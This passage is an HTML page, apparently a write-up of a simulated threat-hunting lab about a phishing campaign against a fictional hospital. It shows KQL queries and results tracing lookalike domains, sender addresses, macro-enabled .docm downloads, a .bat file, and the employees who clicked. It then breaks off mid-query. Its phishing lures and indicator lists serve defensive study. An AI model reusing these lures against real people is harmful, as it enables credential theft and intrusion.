+                    <td>healthupdate@gmail.com</td>
+                    <td>brett_ho@azurecresthospital.med</td>
+                    <td>[EXTERNAL] [Alert!] Critical Pediatric Care Protocol Revamp 🌟</td>
+                    <td>BLOCKED</td>
+                    <td>https://medequipamateurs.org/modules/files/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-27 15:12:25.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>justin_flores@azurecresthospital.med</td>
+                    <td>[EXTERNAL] psst... Important Pediatric Care Procedure Changes 👀</td>
+                    <td>SUSPICIOUS</td>
+                    <td>https://medequipamateurs.org/files/share/public/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-28 15:19:16.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>carla_bledsoe@azurecresthospital.med</td>
+                    <td>[EXTERNAL] [Urgent!] Mandatory Health Protocol Update 😱</td>
+                    <td>CLEAN</td>
+                    <td>https://unhealthyrecordsystems.tech/search/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-28 15:19:16.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>christina_tate@azurecresthospital.med</td>
+                    <td>[EXTERNAL] [Urgent!] Mandatory Health Protocol Update 😱</td>
+                    <td>CLEAN</td>
+                    <td>https://unhealthyrecordsystems.tech/search/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>There are 41 emails containing these malicious domains; this and other queries so far reveal that the threat actors are using only two email addresses for this campaign: <samp>medstaffinfo@hospitalcomm.org</samp> and <samp>healthupdate@gmail.com</samp>. The domains in the links seem to be deliberately alluding to official Azure Crest partners, such as <samp>medequipamateurs.org</samp> being a reference to <samp>medequippros.org</samp>. As a whole:</p>
+          <ul>
+            <li>The malicious domains are:
+              <ul>
+                <li><samp>unhealthyrecordsystems.tech</samp></li>
+                <li><samp>medequipamateurs.org</samp></li>
+                <li><samp>takeyatimecarepartners.com</samp></li>
+                <li><samp>pharmasecondbest.net</samp></li>
+              </ul>
+            </li>
+            <li>The malicious email addresses are:
+              <ul>
+                <li><samp>medstaffinfo@hospitalcomm.org</samp></li>
+                <li><samp>healthupdate@gmail.com</samp></li>
+              </ul>
+            </li>
+            <li>The subject lines are:
+              <ul>
+                <li><samp>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</samp></li>
+                <li><samp>[EXTERNAL] 🩺 Vital Update: Groundbreaking Pediatric Care Advances 🚀</samp></li>
+                <li><samp>[EXTERNAL] FW: [Alert!] Critical Pediatric Care Protocol Revamp 🌟</samp></li>
+                <li><samp>[EXTERNAL] FW: 🔑 Exclusive Access: Innovative Pediatric Care Techniques Unveiled 🔍</samp></li>
+                <li><samp>[EXTERNAL] FW: 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</samp></li>
+                <li><samp>[EXTERNAL] [Urgent!] Mandatory Health Protocol Update 😱</samp></li>
+                <li><samp>[EXTERNAL] RE: 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</samp></li>
+                <li><samp>[EXTERNAL] [Alert!] Critical Pediatric Care Protocol Revamp 🌟</samp></li>
+                <li><samp>[EXTERNAL] FW: 🚑 Attention Required: Urgent Pediatric Health Procedure Update 🌈</samp></li>
+                <li><samp>[EXTERNAL] RE: 🚑 Attention Required: Urgent Pediatric Health Procedure Update 🌈</samp></li>
+                <li><samp>[EXTERNAL] psst... Important Pediatric Care Procedure Changes 👀</samp></li>
+              </ul>
+            </li>
+            <li>The files in the download links are:
+              <ul>
+                <li><samp>Pediatric_Care_Update.docm</samp></li>
+                <li><samp>New_Healthcare_Protocols.docm</samp></li>
+              </ul>
+            </li>
+          </ul>
+          <p>I'll check these domains against <samp>PassiveDns</samp> to see if I can uncover any new domains and IP addresses.</p>
+          <pre><kbd>let bad_emails =
+Email
+| where subject =~ "[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨"
+| distinct sender;
+let bad_domains =
+Email
+| where sender in (bad_emails)
+or reply_to in (bad_emails)
+| distinct tostring(parse_url(link).Host);
+Email
+| where tostring(parse_url(link).Host) in (bad_domains)
+| distinct tostring(parse_url(link).Host)
+| lookup PassiveDns on $left.Host == $right.domain
+| distinct ip</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>ip</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>135.103.59.74</td>
+                  </tr>
+                  <tr>
+                    <td>131.92.62.82</td>
+                  </tr>
+                  <tr>
+                    <td>62.121.133.43</td>
+                  </tr>
+                  <tr>
+                    <td>93.142.203.80</td>
+                  </tr>
+                  <tr>
+                    <td>215.95.144.58</td>
+                  </tr>
+                  <tr>
+                    <td>25.126.98.121</td>
+                  </tr>
+                  <tr>
+                    <td>16.101.245.182</td>
+                  </tr>
+                  <tr>
+                    <td>96.120.124.180</td>
+                  </tr>
+                  <tr>
+                    <td>131.190.102.173</td>
+                  </tr>
+                  <tr>
+                    <td>115.12.60.150</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Further nested <samp>lookup</samp>s to find domains or more IP addresses don't return anything else. As a reminder, the malicious domains that point to these IP addresses are: <samp>unhealthyrecordsystems.tech</samp>, <samp>medequipamateurs.org</samp>, <samp>takeyatimecarepartners.com</samp>, <samp>pharmasecondbest.net</samp>.</p>
+          <p>During the investigation, <i>The Valdorian Times</i> posted a breaking news report on doctors being unable to access the hospital's internal systems and voicing their displeasure to the press.</p>
+        </section> <!--section 2-->
+        <section id="section3"><!--section 3-->
+          <h3>Section 3 - The Phisher's Net</h3>
+          <p>Things got more complicated with the Valdorian Times' reports. I keep on investigating, pivoting towards checking just how many of the targeted employees clicked on the links.</p>
+          <pre><kbd>let bad_emails =
+Email
+| where subject =~ "[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨"
+| distinct sender;
+let bad_domains =
+Email
+| where sender in (bad_emails)
+or reply_to in (bad_emails)
+| distinct tostring(parse_url(link).Host);
+OutboundNetworkEvents
+| where tostring(parse_url(url).Host) in (bad_domains)</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>method</th>
+                    <th>src_ip</th>
+                    <th>user_agent</th>
+                    <th>url</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-03-01 11:57:43.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.69</td>
+                    <td>Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)</td>
+                    <td>http://unhealthyrecordsystems.tech/search/public/share/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-01 12:05:43.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.96</td>
+                    <td>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0</td>
+                    <td>http://unhealthyrecordsystems.tech/search/public/share/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-01 12:09:43.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.110</td>
+                    <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36</td>
+                    <td>http://unhealthyrecordsystems.tech/search/public/share/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-01 12:31:43.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.175</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36</td>
+                    <td>http://unhealthyrecordsystems.tech/search/public/share/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-04 11:02:18.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.16</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36</td>
+                    <td>http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-04 11:14:18.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.106</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko</td>
+                    <td>http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-04 11:28:18.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.2</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0</td>
+                    <td>http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-04 11:33:18.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.35</td>
+                    <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Safari/537.36</td>
+                    <td>http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-04 11:33:18.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.202</td>
+                    <td>Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)</td>
+                    <td>http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-05 16:51:35.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.34</td>
+                    <td>Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)</td>
+                    <td>https://unhealthyrecordsystems.tech/search/share/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-05 17:04:35.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.167</td>
+                    <td>Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</td>
+                    <td>https://unhealthyrecordsystems.tech/search/share/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-06 12:12:48.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.174</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0</td>
+                    <td>https://medequipamateurs.org/modules/online/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-06 12:40:48.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.19</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; WOW64; Trident/7.0; rv:11.0) like Gecko</td>
+                    <td>https://medequipamateurs.org/modules/online/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-07 15:32:33.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.66</td>
+                    <td>Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0</td>
+                    <td>https://unhealthyrecordsystems.tech/search/published/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-12 14:09:07.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.112</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; rv:47.0) Gecko/20100101 Firefox/47.0</td>
+                    <td>http://takeyatimecarepartners.com/files/public/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-12 14:10:07.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.71</td>
+                    <td>Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko</td>
+                    <td>http://takeyatimecarepartners.com/files/public/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-12 14:38:07.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.154</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0</td>
+                    <td>http://takeyatimecarepartners.com/files/public/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-13 11:32:18.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.229</td>
+                    <td>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.1; Win64; x64; Trident/5.0)</td>
+                    <td>http://takeyatimecarepartners.com/online/online/online/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-14 10:37:39.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.174</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0</td>
+                    <td>http://takeyatimecarepartners.com/images/images/files/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-14 10:37:39.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.183</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</td>
+                    <td>http://takeyatimecarepartners.com/images/images/files/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-15 12:20:43.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.166</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Safari/537.36</td>
+                    <td>https://takeyatimecarepartners.com/search/search/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-15 12:29:43.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.105</td>
+                    <td>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0</td>
+                    <td>https://takeyatimecarepartners.com/search/search/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-18 10:32:33.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.187</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko</td>
+                    <td>https://unhealthyrecordsystems.tech/share/search/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-18 10:48:33.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.103</td>
+                    <td>Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/6.0)</td>
+                    <td>https://unhealthyrecordsystems.tech/share/search/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-20 12:07:12.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.86</td>
+                    <td>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0</td>
+                    <td>http://medequipamateurs.org/share/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-20 12:10:12.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.170</td>
+                    <td>Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0</td>
+                    <td>http://medequipamateurs.org/share/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-20 12:17:12.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.46</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36</td>
+                    <td>http://medequipamateurs.org/share/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-20 12:45:12.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.54</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0</td>
+                    <td>http://medequipamateurs.org/share/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-21 11:51:00.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.133</td>
+                    <td>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; WOW64; Trident/5.0)</td>
+                    <td>https://pharmasecondbest.net/search/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-22 12:18:55.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.78</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0</td>
+                    <td>https://unhealthyrecordsystems.tech/published/published/images/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-22 12:22:55.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.117</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0</td>
+                    <td>https://unhealthyrecordsystems.tech/published/published/images/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-22 12:29:55.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.224</td>
+                    <td>Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Trident/4.0)</td>
+                    <td>https://unhealthyrecordsystems.tech/published/published/images/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-25 16:03:08.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.61</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0</td>
+                    <td>http://medequipamateurs.org/online/share/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-25 16:26:08.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.221</td>
+                    <td>Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)</td>
+                    <td>http://medequipamateurs.org/online/share/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-25 16:37:08.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.31</td>
+                    <td>Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36</td>
+                    <td>http://medequipamateurs.org/online/share/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-27 15:13:25.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.63</td>
+                    <td>Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)</td>
+                    <td>https://medequipamateurs.org/files/share/public/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-28 15:43:16.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.157</td>
+                    <td>Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36</td>
+                    <td>https://unhealthyrecordsystems.tech/search/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-28 16:13:16.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.108</td>
+                    <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36</td>
+                    <td>https://unhealthyrecordsystems.tech/search/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-02 11:29:37.0000</td>
+                    <td>GET</td>
+                    <td>10.10.0.2</td>
+                    <td>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0</td>
+                    <td>https://medequipamateurs.org/UrTottalyPwned.bat</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>There are 39 instances; using the <samp>distinct</samp> keyword shows that 37 distinct employees clicked the links and downloaded the malicious files. Notoriously, there is a new downloaded file: <samp>UrTottalyPwned.bat</samp>, downloaded off <samp>medequipamateurs.org</samp> by IP address <samp>10.10.0.2</samp>; that same IP address downloaded <samp>New_Healthcare_Protocols.docm</samp> 29 days before. The affected employees are:</p>
+          <pre><kbd>let bad_emails =
+Email
+| where subject =~ "[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨"
+| distinct sender;
+let bad_domains =
+Email
+| where sender in (bad_emails)
+or reply_to in (bad_emails)
+| distinct tostring(parse_url(link).Host);
+OutboundNetworkEvents
+| where tostring(parse_url(url).Host) in (bad_domains)
+| distinct src_ip
+| lookup Employees on $left.src_ip == $right.ip_addr
+| distinct role, name, src_ip, hostname
+| sort by role asc</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>role</th>
+                    <th>name</th>
+                    <th>src_ip</th>
+                    <th>hostname</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>Database Administrator</td>
+                    <td>Roy Trenneman</td>
+                    <td>10.10.0.2</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Judy Tomlinson</td>
+                    <td>10.10.0.54</td>
+                    <td>THSQ-DESKTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Eunice Birks</td>
+                    <td>10.10.0.66</td>
+                    <td>CF1D-LAPTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Scott Horwath</td>
+                    <td>10.10.0.34</td>
+                    <td>7WSV-MACHINE</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Constance Eldredge</td>
+                    <td>10.10.0.61</td>
+                    <td>ZWU6-MACHINE</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Anita Hummel</td>
+                    <td>10.10.0.105</td>
+                    <td>C4O7-LAPTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Dean Aitken</td>
+                    <td>10.10.0.86</td>
+                    <td>JSJU-MACHINE</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Michael Frith</td>
+                    <td>10.10.0.19</td>
+                    <td>UBAA-MACHINE</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Monte Baez</td>
+                    <td>10.10.0.35</td>
+                    <td>3ORE-LAPTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Michael Bauer</td>
+                    <td>10.10.0.31</td>
+                    <td>7IXV-LAPTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Geneva Arthur</td>
+                    <td>10.10.0.110</td>
+                    <td>5QJC-DESKTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Joseph Markland</td>
+                    <td>10.10.0.69</td>
+                    <td>P3EX-DESKTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Carla Bledsoe</td>
+                    <td>10.10.0.108</td>
+                    <td>AI4T-LAPTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Thomas Mccloskey</td>
+                    <td>10.10.0.46</td>
+                    <td>JFJD-MACHINE</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>Susan Deloatch</td>
+                    <td>10.10.0.117</td>
+                    <td>5VHH-DESKTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Bradley Park</td>
+                    <td>10.10.0.221</td>
+                    <td>1RE1-MACHINE</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Justin Flores</td>
+                    <td>10.10.0.63</td>
+                    <td>S3FA-LAPTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Archie Mireles</td>
+                    <td>10.10.0.78</td>
+                    <td>Y6J9-DESKTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Christina Tate</td>
+                    <td>10.10.0.157</td>
+                    <td>QWTX-DESKTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Claire Nastasi</td>
+                    <td>10.10.0.224</td>
+                    <td>WVGN-MACHINE</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Gary Berger</td>
+                    <td>10.10.0.229</td>
+                    <td>6U1W-LAPTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Scott Thibault</td>
+                    <td>10.10.0.183</td>
+                    <td>XUCT-MACHINE</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Jonathan Bueno</td>
+                    <td>10.10.0.112</td>
+                    <td>KFL4-DESKTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Beatrice Hogg</td>
+                    <td>10.10.0.103</td>
+                    <td>EF2R-DESKTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Elizabeth Harris</td>
+                    <td>10.10.0.175</td>
+                    <td>FXXV-DESKTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Sheldon Pella</td>
+                    <td>10.10.0.133</td>
+                    <td>XBYY-DESKTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Lillian Mcfarland</td>
+                    <td>10.10.0.71</td>
+                    <td>YO0I-MACHINE</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Maudie Frierson</td>
+                    <td>10.10.0.154</td>
+                    <td>9R9Z-MACHINE</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Charles Roberge</td>
+                    <td>10.10.0.166</td>
+                    <td>60BK-LAPTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Harry Barnes</td>
+                    <td>10.10.0.106</td>
+                    <td>SIJP-LAPTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>John Walker</td>
+                    <td>10.10.0.187</td>
+                    <td>MBJX-DESKTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Claire Arce</td>
+                    <td>10.10.0.202</td>
+                    <td>CKQF-MACHINE</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Charlene Simpson</td>
+                    <td>10.10.0.167</td>
+                    <td>QNTA-DESKTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Dolores Rader</td>
+                    <td>10.10.0.170</td>
+                    <td>0N1N-LAPTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Melvin Hudgens</td>
+                    <td>10.10.0.96</td>
+                    <td>M8D0-MACHINE</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Jerry Jones</td>
+                    <td>10.10.0.174</td>
+                    <td>ZQHM-LAPTOP</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>Edward Williamson</td>
+                    <td>10.10.0.16</td>
+                    <td>QKD1-MACHINE</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>The IP address that downloaded <samp>New_Healthcare_Protocols.docm</samp>, followed by <samp>UrTottalyPwned.bat</samp>, belongs to the Database Administrator Roy Trenneman, who also designed and created the current ERP system in use by the hospital.</p>
+          <p>I want to check how many instances of these files exist on Azure Crest computers; to do so, I use:</p>
+          <pre><kbd>let bad_emails =
+Email
+| where subject =~ "[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨"
+| distinct sender;
+let bad_domains =
+Email
+| where sender in (bad_emails)
+or reply_to in (bad_emails)
+| distinct tostring(parse_url(link).Host);
+OutboundNetworkEvents
+| where tostring(parse_url(url).Host) in (bad_domains)
+| distinct tostring(parse_path(tostring(parse_url(url).Path)).Filename)
+| lookup FileCreationEvents on $left.Filename == $right.filename
+| summarize count() by Filename</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>Filename</th>
+                    <th>count_</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>UrTottalyPwned.bat</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>New_Healthcare_Protocols.docm</td>
+                    <td>23</td>
+                  </tr>
+                  <tr>
+                    <td>Pediatric_Care_Update.docm</td>
+                    <td>15</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>A total of 39 files; 38 are dropper files, and one is likely the malware responsible for locking up the database (or destroying it; in any case, the data is inaccessible).</p>
+          <p>Given these events, I'll investigate the Database Administrator's device.</p>
+          <pre><kbd>ProcessEvents
+| where hostname == "SUPER-DB-SERVER-9000"
